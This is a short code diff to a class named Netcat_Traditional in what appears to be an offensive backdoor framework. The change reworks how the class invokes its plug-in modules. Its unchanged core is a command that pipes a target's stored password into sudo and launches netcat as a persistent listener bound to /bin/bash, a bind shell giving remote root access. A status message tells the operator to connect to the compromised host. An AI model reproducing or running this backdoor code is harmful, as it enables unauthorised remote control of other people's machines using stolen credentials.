@@ -11,11 +11,7 @@ class Netcat_Traditional(Backdoor):
                 "port"   : Option("port", 53926, "port to connect to", True),
                 }
         self.modules = {} 
-        self.portModules = {}
-	self.allow_modules = True
-
-    def get_port(self):
-        return self.get_value("port")
+        self.allow_modules = True
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % self.get_value("port")
@@ -30,8 +26,4 @@ class Netcat_Traditional(Backdoor):
         print(GOOD + "Backdoor attempted. Use nc " + target.hostname + " %s." % port)
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
-	for mod in self.portModules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
-
+            mod.exploit()
